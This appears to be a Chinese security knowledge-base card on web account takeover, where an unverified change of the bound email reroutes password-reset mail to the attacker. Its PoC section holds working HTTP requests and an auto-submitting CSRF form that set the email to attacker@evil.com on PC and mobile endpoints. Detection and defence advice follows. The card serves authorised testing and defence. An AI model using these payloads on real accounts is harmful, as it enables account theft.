---
id: web-generic-auth-email-change-no-verification-password-reset-takeover
title: 修改绑定邮箱无二次验证 → 密码重置邮件改道 → 账号接管
type: scenario
domain: web
path: web/generic/auth
technique: email-change-no-verification-account-takeover
aliases:
- 任意邮箱绑定
- 邮箱修改无验证
- 密码重置邮件改道
- 账号恢复渠道劫持
- saveEmail CSRF
- modify-contact-info 改邮箱
tags:
- web
- auth
- account-takeover
- password-reset
- business-logic
- email
- csrf
- mobile-api
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V66
  verified_at: '2026-11-05T12:04:14+08:00'
  notes: 已对照原文核对：PC saveEmail.action 仅 newEmail、无验证码/旧邮箱/密码；缺 Origin 即放行（带错误 Origin 才 403）；移动端 modify-contact-info 仅 token+account_email 且 sign/timestamp/random 不校验（图02 A/B/C 三路均200）；sendResetMail.action 使用 user.mail（图04）→ 重置邮件改道接管；图03 无sign改邮箱并读回验证一致。原文已脱敏、未给真实域名，未在本机复现；已修正失效 wikilink web-generic-csrf 为 web-generic-csrf-missing-token-state-changing-endpoint。
---

## 一句话结论

当系统允许登录用户修改绑定邮箱、却不要求旧邮箱确认/密码/短信验证码时，攻击者只要拿到受害者的有效会话或 Token，就能把账号恢复邮箱改成自己的地址，再触发密码重置，让重置邮件发到攻击者邮箱，最终设置新密码并完全接管账号；同一邮箱字段在 PC 表单、直接 POST、CSRF 和移动端 API 上可能有多个入口，修了一个入口不代表其他入口安全。

## 原理

- 绑定邮箱是账号恢复渠道：密码重置、找回账号、安全通知都依赖它。修改邮箱等价于转移账号恢复控制权，属于敏感操作，应与修改密码同级做二次验证。
- 常见缺陷是服务端只校验“当前已登录”，不校验“是否有权修改这个字段”：`saveEmail.action` 只接收一个 `newEmail` 参数，没有验证码、旧邮箱确认或密码二次认证。
- 多入口问题：同一数据库字段 `user.mail` 可能同时被 PC 个人信息表单、直接 POST 接口、移动端 `modify-contact-info` API 修改；各端由不同团队开发，安全加固往往只覆盖被报告的那个入口。
- CSRF 变体：服务端只检查 `Origin` 头，且“带 Origin 且不等于白名单才拒绝”；请求不带 `Origin` 时直接放行，也不校验 `Referer`，攻击者可用自动提交表单让受害者在不知情时改邮箱。
- 移动端变体：API 只要有效 Token 就接受 `account_email`，不要求 sign、验证码或旧邮箱确认；即使前端有签名，服务端也可能不校验，攻击者可直接构造请求。
- 完整链：获取受害者 Token（社工/钓鱼/XSS/同网段嗅探）→ 调改邮箱接口 → PC 端 `sendResetMail.action` 向 `user.mail` 发重置邮件 → 攻击者邮箱收链接 → 设置新密码 → 原账号被接管。链的关键是“改邮箱无验证”和“密码重置信任该邮箱”两个业务逻辑缺陷叠加。

## 触发条件

- 系统提供修改绑定邮箱/联系方式的功能，且服务端不要求旧邮箱、密码或短信验证码；
- 密码重置流程使用用户资料中的邮箱字段作为收件地址；
- 攻击者持有受害者的有效会话/Token（或能通过 CSRF 让受害者浏览器代为提交）；
- CSRF 变体要求接口不校验 CSRF Token，且对缺失 `Origin` 的请求放行；
- 移动端变体要求 Token 有效，签名校验缺失或可复现。

## 利用步骤

1. 以普通用户登录，找到修改邮箱/联系方式的请求（PC 表单 AJAX、`saveEmail.action`、移动端 `modify-contact-info` 等）。
2. 提交一个新邮箱，观察是否需要验证码、旧邮箱确认或密码；若只凭会话/Token 即成功，确认漏洞。
3. CSRF 变体：构造自动提交的 HTML 表单 POST 到改邮箱接口，不设置 `Origin` 头，诱导已登录受害者访问。
4. 移动端变体：用受害者 Token 直接 POST `account_email=attacker@evil.com`，不传 sign/timestamp/random，确认返回成功。
5. 触发密码重置接口（如 `sendResetMail.action`），确认重置邮件发送到刚修改的邮箱。
6. 从攻击者邮箱打开重置链接，设置新密码并登录，验证账号接管。
7. 授权测试完成后把邮箱恢复原值，并清理测试数据。

## PoC

```http
### PC 直接 POST：只带新邮箱，无验证码/旧邮箱/密码
POST /eams/security/my!saveEmail.action HTTP/1.1
Host: target.edu.cn
Cookie: JSESSIONID=<victim-session>
Content-Type: application/x-www-form-urlencoded

newEmail=attacker@evil.com
```

```html
<!-- CSRF：不带 Origin 头，自动提交 -->
<form action="https://target.edu.cn/eams/security/my!saveEmail.action" method="POST">
  <input type="hidden" name="newEmail" value="attacker@evil.com">
</form>
<script>document.forms[0].submit()</script>
```

```http
### 移动端 API：只要 Token，不传 sign/timestamp/random
POST /app-ws/ws/app-service/student/user/modify-contact-info HTTP/1.1
Host: target-app.edu.cn
Content-Type: application/x-www-form-urlencoded

token=<victim-token>&mobile_phone=13800000000&account_email=attacker@evil.com
```

```text
响应: {"business_data":"eyJzdWNjZXNzIjp0cnVlfQ==","err_code":"00000"}
base64 解码: {"success":true}
```

## 变体与关联

- 变体：手机号、备用邮箱、MFA 恢复方式等账号恢复字段同样可能“改绑无验证”，改手机号后可接短信重置。
- 变体：同一字段的多个入口（PC 表单、直接接口、CSRF、移动端 API、小程序、开放平台）应逐一测试；只修一个入口时攻击链仍可能成立。
- 关联：[[web-generic-auth-api-signature-validation-differential-test]]（移动端签名未校验的检测方法；签名缺失会进一步降低改邮箱门槛）。
- 关联：[[web-generic-auth-password-reset-host-header-poisoning]]、[[web-generic-auth-password-reset-username-tampering]]（密码重置流程的其他劫持方式）。
- 关联：[[web-generic-csrf-missing-token-state-changing-endpoint]]（CSRF 基础与 Token 校验缺失）。
- 影响边界：需要受害者有效会话/Token 或 CSRF 交互；若修改邮箱要求旧邮箱/密码/短信验证，且密码重置不信任未验证邮箱，则链不成立。

## 检测与防御

- 检测：修改邮箱/手机号接口的请求中只有新值、没有验证码/旧值/密码字段；同一账号短时间内修改恢复邮箱后立即触发密码重置；缺失 `Origin` 的跨站表单提交。
- 检测：对 `saveEmail`、`modify-contact-info`、`update-email` 等接口做未授权/越权测试；对比 PC 与移动端是否都做了二次验证。
- 防御：修改邮箱/手机号等恢复字段必须要求旧邮箱确认、密码或短信验证码之一；向旧邮箱发送变更通知并提供撤回入口；变更后使现有会话失效。
- 防御：密码重置只信任“已验证”的邮箱，未验证的新邮箱不能作为重置收件地址；重置链接一次性、短时效、绑定用户与会话。
- 防御：CSRF 使用服务端 Token 并校验 `Origin`/`Referer` 的“缺失即拒绝”，不能只校验“存在且不匹配才拒绝”；统一在 Service 层对敏感字段修改做不可绕过的安全约束，而不是在各 Controller 分别修补。
